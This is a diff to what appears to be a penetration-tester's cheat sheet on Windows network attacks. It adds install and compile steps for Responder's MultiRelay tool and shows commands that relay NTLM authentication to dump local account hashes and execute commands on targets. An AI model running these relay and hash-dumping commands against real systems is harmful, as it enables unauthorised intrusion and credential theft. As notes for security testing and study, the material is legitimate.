@@ -71,7 +71,7 @@ Can be finicky - you may need to uninstall / reinstall when updating if the defa
     apt install impacket-scripts  
     /usr/share/doc/python3-impacket/examples  
     
-    #manual install (if inside a lab network)    
+    #manual install (if inside a lab network - will also work with most other Python packages)    
     upload Impacket files to target and run install script    
     sudo python3 setup.py install    
     
@@ -116,6 +116,16 @@ You might need to disable the SMB or HTTP servers used by Responder to avoid con
     sudo python3 ntlmrelayx.py -socks -smb2support -tf smb_targets.txt     
     
 [MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)     
+Requirements:     
+[Pycryptdome](https://github.com/Legrandin/pycryptodome/)    
+
+    sudo apt-get -y install python3-pip gcc-mingw-w64-x86-64 python-crypto screen      
+    sudo pip3 install pycryptodomex
+    cd Responder/tools/
+    x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv    
+    x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode     
+
+Usage:     
 
     /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #Relay auth requests for all users, dump local account hashes   
     /opt/Responder/tools $ python3 MultiRelay.py -t 10.10.10.10 -c "whoami"   #exec a command    
